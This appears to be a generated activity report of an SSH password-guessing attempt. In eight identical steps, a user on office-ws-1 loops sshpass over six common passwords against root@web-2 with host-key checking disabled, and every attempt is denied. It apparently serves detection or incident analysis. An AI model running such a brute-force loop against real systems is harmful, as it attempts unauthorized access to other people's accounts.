1. Activity story

The activity runs as `sre.alice` from `office-ws-1`, directed at `web-2`.
It began at 2026-07-26T19:52:20+00:00 and finished at 2026-07-26T19:55:24+00:00.

2. What was executed

Step 1 — on `office-ws-1` as `sre.alice`, from 2026-07-26T19:52:20+00:00 to 2026-07-26T19:52:40+00:00 (exit status 0):

    for pw in hunter2 password123 letmein admin secret qwerty; do
      sshpass -p "$pw" ssh -o StrictHostKeyChecking=no \
        -o ConnectTimeout=3 -o PreferredAuthentications=password \
        -o NumberOfPasswordPrompts=1 \
        root@web-2 true 2>&1 | head -1 || true
    done

It printed:

    root@web-2: Permission denied (publickey,password).
    root@web-2: Permission denied (publickey,password).
    root@web-2: Permission denied (publickey,password).
    root@web-2: Permission denied (publickey,password).
    root@web-2: Permission denied (publickey,password).
    root@web-2: Permission denied (publickey,password).

Step 2 — on `office-ws-1` as `sre.alice`, from 2026-07-26T19:52:44+00:00 to 2026-07-26T19:53:02+00:00 (exit status 0):

    for pw in hunter2 password123 letmein admin secret qwerty; do
      sshpass -p "$pw" ssh -o StrictHostKeyChecking=no \
        -o ConnectTimeout=3 -o PreferredAuthentications=password \
        -o NumberOfPasswordPrompts=1 \
        root@web-2 true 2>&1 | head -1 || true
    done

It printed:

    root@web-2: Permission denied (publickey,password).
    root@web-2: Permission denied (publickey,password).
    root@web-2: Permission denied (publickey,password).
    root@web-2: Permission denied (publickey,password).
    root@web-2: Permission denied (publickey,password).
    root@web-2: Permission denied (publickey,password).

Step 3 — on `office-ws-1` as `sre.alice`, from 2026-07-26T19:53:06+00:00 to 2026-07-26T19:53:26+00:00 (exit status 0):

    for pw in hunter2 password123 letmein admin secret qwerty; do
      sshpass -p "$pw" ssh -o StrictHostKeyChecking=no \
        -o ConnectTimeout=3 -o PreferredAuthentications=password \
        -o NumberOfPasswordPrompts=1 \
        root@web-2 true 2>&1 | head -1 || true
    done

It printed:

    root@web-2: Permission denied (publickey,password).
    root@web-2: Permission denied (publickey,password).
    root@web-2: Permission denied (publickey,password).
    root@web-2: Permission denied (publickey,password).
    root@web-2: Permission denied (publickey,password).
    root@web-2: Permission denied (publickey,password).

Step 4 — on `office-ws-1` as `sre.alice`, from 2026-07-26T19:53:30+00:00 to 2026-07-26T19:53:49+00:00 (exit status 0):

    for pw in hunter2 password123 letmein admin secret qwerty; do
      sshpass -p "$pw" ssh -o StrictHostKeyChecking=no \
        -o ConnectTimeout=3 -o PreferredAuthentications=password \
        -o NumberOfPasswordPrompts=1 \
        root@web-2 true 2>&1 | head -1 || true
    done

It printed:

    root@web-2: Permission denied (publickey,password).
    root@web-2: Permission denied (publickey,password).
    root@web-2: Permission denied (publickey,password).
    root@web-2: Permission denied (publickey,password).
    root@web-2: Permission denied (publickey,password).
    root@web-2: Permission denied (publickey,password).

Step 5 — on `office-ws-1` as `sre.alice`, from 2026-07-26T19:53:53+00:00 to 2026-07-26T19:54:13+00:00 (exit status 0):

    for pw in hunter2 password123 letmein admin secret qwerty; do
      sshpass -p "$pw" ssh -o StrictHostKeyChecking=no \
        -o ConnectTimeout=3 -o PreferredAuthentications=password \
        -o NumberOfPasswordPrompts=1 \
        root@web-2 true 2>&1 | head -1 || true
    done

It printed:

    root@web-2: Permission denied (publickey,password).
    root@web-2: Permission denied (publickey,password).
    root@web-2: Permission denied (publickey,password).
    root@web-2: Permission denied (publickey,password).
    root@web-2: Permission denied (publickey,password).
    root@web-2: Permission denied (publickey,password).

Step 6 — on `office-ws-1` as `sre.alice`, from 2026-07-26T19:54:17+00:00 to 2026-07-26T19:54:36+00:00 (exit status 0):

    for pw in hunter2 password123 letmein admin secret qwerty; do
      sshpass -p "$pw" ssh -o StrictHostKeyChecking=no \
        -o ConnectTimeout=3 -o PreferredAuthentications=password \
        -o NumberOfPasswordPrompts=1 \
        root@web-2 true 2>&1 | head -1 || true
    done

It printed:

    root@web-2: Permission denied (publickey,password).
    root@web-2: Permission denied (publickey,password).
    root@web-2: Permission denied (publickey,password).
    root@web-2: Permission denied (publickey,password).
    root@web-2: Permission denied (publickey,password).
    root@web-2: Permission denied (publickey,password).

Step 7 — on `office-ws-1` as `sre.alice`, from 2026-07-26T19:54:40+00:00 to 2026-07-26T19:55:00+00:00 (exit status 0):

    for pw in hunter2 password123 letmein admin secret qwerty; do
      sshpass -p "$pw" ssh -o StrictHostKeyChecking=no \
        -o ConnectTimeout=3 -o PreferredAuthentications=password \
        -o NumberOfPasswordPrompts=1 \
        root@web-2 true 2>&1 | head -1 || true
    done

It printed:

    root@web-2: Permission denied (publickey,password).
    root@web-2: Permission denied (publickey,password).
    root@web-2: Permission denied (publickey,password).
    root@web-2: Permission denied (publickey,password).
    root@web-2: Permission denied (publickey,password).
    root@web-2: Permission denied (publickey,password).

Step 8 — on `office-ws-1` as `sre.alice`, from 2026-07-26T19:55:04+00:00 to 2026-07-26T19:55:24+00:00 (exit status 0):

    for pw in hunter2 password123 letmein admin secret qwerty; do
      sshpass -p "$pw" ssh -o StrictHostKeyChecking=no \
        -o ConnectTimeout=3 -o PreferredAuthentications=password \
        -o NumberOfPasswordPrompts=1 \
        root@web-2 true 2>&1 | head -1 || true
    done

It printed:

    root@web-2: Permission denied (publickey,password).
    root@web-2: Permission denied (publickey,password).
    root@web-2: Permission denied (publickey,password).
    root@web-2: Permission denied (publickey,password).
    root@web-2: Permission denied (publickey,password).
    root@web-2: Permission denied (publickey,password).
